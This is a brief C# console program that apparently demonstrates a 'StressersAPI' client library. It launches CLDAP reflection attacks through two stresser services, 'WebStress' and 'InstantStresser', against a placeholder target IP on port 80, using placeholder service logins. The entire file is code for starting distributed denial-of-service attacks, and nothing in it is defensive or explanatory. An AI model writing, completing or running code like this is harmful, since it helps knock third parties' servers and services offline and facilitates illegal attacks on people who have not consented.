using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            /* API For only browser Edge */
            StressersAPI.WebStress webStress = new StressersAPI.WebStress();
            Console.WriteLine(webStress.StartStrees("IP", 80, StressersAPI.WebStress.Method.CLDAP, "Login from WebSite", "Password from WebSite"));
            
            StressersAPI.InstantStresser instantStresser = new StressersAPI.InstantStresser();
            Console.WriteLine(instantStresser.StartStrees("IP", 80, StressersAPI.InstantStresser.Method.CLDAP, "Login from WebSite", "Password from WebSite"));
        }
    }
}
